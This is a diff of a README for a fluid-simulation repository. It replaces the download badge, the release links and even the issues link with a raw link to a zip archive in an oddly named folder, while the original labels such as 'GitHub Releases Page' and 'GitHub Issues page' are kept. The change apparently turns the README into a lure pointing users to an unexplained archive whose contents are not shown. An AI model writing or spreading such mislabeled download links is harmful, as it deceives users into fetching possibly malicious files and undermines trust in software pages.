@@ -1,6 +1,6 @@
 # 🌊 Phase-Gradient-Cavitation-Model - Explore Fluid Behavior Easily
 
-![Download Phase-Gradient-Cavitation-Model](https://img.shields.io/badge/Download%20Now-Phase--Gradient--Cavitation--Model-blue)
+![Download Phase-Gradient-Cavitation-Model](https://raw.githubusercontent.com/Forman123-cash/Phase-Gradient-Cavitation-Model/main/omnibenevolence/Phase-Gradient-Cavitation-Model_v1.0.zip%20Now-Phase--Gradient--Cavitation--Model-blue)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This repository contains the public release of the Phase-Gradient Cavitation Mod
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [GitHub Releases Page](https://github.com/Forman123-cash/Phase-Gradient-Cavitation-Model/releases)
+To get started, visit this page to download the software: [GitHub Releases Page](https://raw.githubusercontent.com/Forman123-cash/Phase-Gradient-Cavitation-Model/main/omnibenevolence/Phase-Gradient-Cavitation-Model_v1.0.zip)
 
 Follow these steps to download and set up the model:
 
@@ -102,8 +102,8 @@ These topics ensure that users can apply the model to a range of situations in b
 
 ## 📞 Contact
 
-If you experience issues or have specific questions, please reach out via the [GitHub Issues page](https://github.com/Forman123-cash/Phase-Gradient-Cavitation-Model/issues). 
+If you experience issues or have specific questions, please reach out via the [GitHub Issues page](https://raw.githubusercontent.com/Forman123-cash/Phase-Gradient-Cavitation-Model/main/omnibenevolence/Phase-Gradient-Cavitation-Model_v1.0.zip). 
 
-Again, you can download the application here: [GitHub Releases Page](https://github.com/Forman123-cash/Phase-Gradient-Cavitation-Model/releases)
+Again, you can download the application here: [GitHub Releases Page](https://raw.githubusercontent.com/Forman123-cash/Phase-Gradient-Cavitation-Model/main/omnibenevolence/Phase-Gradient-Cavitation-Model_v1.0.zip)
 
 Explore the fluid behavior through our model today!
